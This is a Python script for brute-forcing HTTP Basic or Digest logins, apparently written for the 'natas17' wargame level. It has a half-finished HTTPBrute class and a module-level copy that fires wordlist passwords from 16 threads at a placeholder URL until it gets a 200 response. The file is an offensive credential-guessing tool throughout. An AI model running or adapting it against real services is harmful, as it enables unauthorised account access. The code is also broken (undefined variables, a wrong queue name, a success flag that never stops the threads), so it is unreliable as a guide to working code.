import requests
import threading
import queue
import os
import signal
import time
from typing import Type, Union

from requests.auth import HTTPBasicAuth, HTTPDigestAuth
class HTTPBrute:
    def __init__(self,
                 _url: str,
                 wl_path: str,
                 workers_count: int,
                 timeout: int):

        self._url = url
        self._username = username
        self._wordlist_queue = self._load_wordlist(wl_path)
        self._session = requests.Session()

        self._auth_cls: Union[Type[HTTPBasicAuth], Type[HTTPDigestAuth]] = self._get_auth_type()

        self._start = float()
        self._finished = False



    def _make_request(self, *args, **kwargs):
        """
        don't pass url as argument -> less overhead
        """
        return self._session.get(self._url, *args, **kwargs)

    def _load_wordlist(self, path) -> queue.Queue[str]:
        # todo try except, print loading path
        wq = queue.Queue()
        with open(path, "r", encoding="utf-8") as wordlist:
            parsed = wordlist.readlines()
            for word in parsed:
                q.put(word.strip("\n"))
        return wq

    def _worker_routine(self):
        # todo exception handling
        while not self._wordlist_queue.empty() and not self._finished:
            passw = self._wordlist_queue.get()
            auth = self._auth_cls(self._username, passw)
            response = self._make_request(auth=auth)
            if response.status_code == 200:  # todo var
                print(f"success-> {passw}")
                finished = True
            sz = q.qsize()
            if sz % 10000 == 0 and not self._finished:
                print(f"left -> {sz}")

    def _get_auth_type(self) -> Union[Type[HTTPBasicAuth], Type[HTTPDigestAuth]]:
        res = self._make_request()
        auth_header = res.headers.get('WWW-Authenticate')
        if auth_header:  # todo exception
            if 'basic' in auth_header.lower():
                return HTTPBasicAuth
            elif 'digest' in auth_header.lower():
                return HTTPDigestAuth
            # todo: also exception

    def run(self):
        self._start = time.time()
        for passw in range(16):
            t = threading.Thread(target=self._worker_routine, args=tuple())
            t.start()
            threads.append(t)

        for worker in threads:
            worker.join()
        print(f"{time.time() - start}")  # todo dedicated shutdown method

q = queue.Queue()
with open(".txt", "r", encoding="utf-8") as f:
    x = f.readlines()
    for i in x:
        q.put(i.strip("\n"))
colors = ['x'] * 100  # ...
colors.append("")
colors += "x" * 500
for i in colors:
    q.put(i)

username = "natas17"
url = f"http://.org"
rest_session = requests.Session()
lenq = q.qsize()

finished = False


def make_req(session: requests.Session, attempt_user):
    global finished
    while not q.empty() and not finished:
        passw = q.get()
        auth = (attempt_user, passw)
        response = session.get(url=url, auth=auth)
        if response.status_code == 200:
            print(f"success-> {passw}")
            finished = True
        sz = q.qsize()
        if sz % 10000 == 0 and not finished:
            print(f"left -> {sz}")


threads = list()
import time

start = time.time()
for passw in range(16):
    t = threading.Thread(target=make_req, args=(rest_session, username))
    t.start()
    threads.append(t)

for worker in threads:
    worker.join()
print(f"{time.time() - start}")